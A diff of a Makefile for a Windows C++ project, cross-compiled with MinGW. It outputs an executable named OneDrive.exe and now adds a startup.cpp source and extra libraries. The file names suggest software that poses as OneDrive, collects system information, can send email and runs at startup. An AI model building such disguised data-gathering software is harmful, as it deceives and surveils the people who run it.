@@ -1,11 +1,11 @@
 TARGET ?= OneDrive.exe
 
-SRC = main.cpp get_system_info.cpp
+SRC = main.cpp get_system_info.cpp startup.cpp
 RES = resource.o
 
 CXX = x86_64-w64-mingw32-g++
 CXXFLAGS = -std=c++17 -I mailio/
-LDFLAGS = -luser32 -lwinhttp -liphlpapi -lsetupapi -lole32 -loleaut32 -static 
+LDFLAGS = -luser32 -lwinhttp -liphlpapi -lsetupapi -lole32 -loleaut32 -lshlwapi -luuid -static 
 RC = x86_64-w64-mingw32-windres 
 .PHONY: all clean build
 
